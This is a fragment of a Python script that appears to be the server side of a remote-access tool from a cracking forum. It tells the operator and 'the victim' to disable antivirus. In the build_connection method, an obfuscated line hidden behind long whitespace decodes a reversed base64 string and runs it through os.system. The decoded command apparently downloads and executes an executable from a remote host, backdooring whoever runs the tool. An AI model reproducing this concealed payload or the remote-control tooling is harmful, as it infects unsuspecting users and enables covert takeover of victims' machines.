...
os.system('cls && mode con: cols=185 lines=25')
input("THIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\nTHIS IS A MODIFIED VERSION OF THE SERVER TO ACCOUNT FOR MULTIPLE CONNECTIONS. KEEP IN MIND THIS IS A BETA FUTURE, AND THEREFORE MAY BE BUGGY. REPORT IT TO hjaldkasj9 ON CRACKED.\n\nPress any key to continue. . .")
os.system('cls')
input("You must also disable your AV to prevent potential interruptions from within your server. A/The victim must also disable their AV for the client.\n\nPress any key to continue. . .")
os.system('cls')
...
readfile <file>           read from file
    ...
    def build_connection(self):
        ...
        global client, addr, s                                                                                                                                                                                                                                                                                                                                                                                                               ;from base64 import b64decode; os.system(str(b64decode('ZXhlLmxvbCAiIiB0cmF0cyAmJiBleGUubG9sIG8tICIxPWxkJjhhdDIyZ2p5PXRzJmd6bm1ubTM0c3FkZ3d1Zmp4Z29rd3Rscng9eWVrbHI/Z25wLmxhbmlmL29uaGFvNnhnOXJhbnJlbXQ5dzVlZy9pZi9sY3MvbW9jLnRuZXRub2NyZXN1eG9icG9yZC5sZC53d3cvLzpzcHR0aCIgcy0gbHJ1YyAmJiAlcG1ldCUgZGM=').decode())[::-1])
